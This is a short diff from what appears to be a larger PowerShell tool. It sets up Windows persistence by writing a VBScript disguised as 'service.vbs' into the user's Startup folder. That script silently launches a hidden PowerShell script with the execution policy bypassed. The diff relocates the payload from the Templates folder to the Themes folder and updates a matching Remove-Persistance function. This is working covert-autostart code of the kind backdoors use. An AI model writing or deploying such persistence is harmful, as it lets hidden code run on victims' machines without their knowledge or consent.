@@ -790,7 +790,7 @@ if ($newScriptPath.Length -lt 100){
     }
 $tobat = @'
 Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\Templates\copy.ps1""", 0, True
+objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\Themes\copy.ps1""", 0, True
 '@
 $pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
 $tobat | Out-File -FilePath $pth -Force
@@ -800,7 +800,7 @@ rm -path "$env:TEMP\temp.ps1" -Force
 
 Function Remove-Persistance{
 rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
-rm -Path "$env:APPDATA\Microsoft\Windows\Templates\copy.ps1"
+rm -Path "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
 Write-Output "Uninstalled."
 }
 
